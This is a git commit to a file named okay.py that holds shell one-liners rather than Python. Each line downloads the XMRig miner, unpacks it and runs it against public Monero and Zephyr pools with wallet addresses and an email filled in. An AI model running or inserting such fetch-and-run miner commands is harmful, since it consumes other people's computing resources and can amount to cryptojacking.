062907a66a7a403154adae0eedf6e1fd647cb6bc
hermawan1234 <144197953+hermawan1234@users.noreply.github.com>
2023-11-13 07:21:34 +0700

    Update okay.py

--- okay.py
+++ okay.py
@@ -17,3 +17,9 @@ var a = "test"
 wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz && cd xmrig-6.20.0 && ./xmrig -o xmr-asia1.nanopool.org:14433 -u 496AJjjf5RTKZ9RgGa1DG6VnGL1BBWTCb7zgLrjbPD2JSbFCTSgANdTgvtuA9gttagW1mY45ANbNW4vh5jveGe4WUTrtbvL.kimochi/yulramlan@gmail.com -p sianjing --tls --coin monero
 
 wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz && cd xmrig-6.20.0 && ./xmrig -o pool.supportxmr.com:3333 -u 496AJjjf5RTKZ9RgGa1DG6VnGL1BBWTCb7zgLrjbPD2JSbFCTSgANdTgvtuA9gttagW1mY45ANbNW4vh5jveGe4WUTrtbvL.kimochi
+
+//miningocean
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz && cd xmrig-6.20.0 && ./xmrig -o zephyr.miningocean.org:5332 -u ZEPHYR2nxoHEZ8cySv6fDBTD2d8VAMMmRCF9zi3jtADj4X3HLkL4f5w4efZAb3kJjd7iStwUFEHPfK6JLooFWs3C44U417bs9f44Y.50000 -p a -a rx/0 -k --donate-level 1
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz && cd xmrig-6.20.0 && ./xmrig -o zephyr.miningocean.org:5332 -u ZEPHYR2nxoHEZ8cySv6fDBTD2d8VAMMmRCF9zi3jtADj4X3HLkL4f5w4efZAb3kJjd7iStwUFEHPfK6JLooFWs3C44U417bs9f44Y.50000 -p b -a rx/0 -k --donate-level 1
+
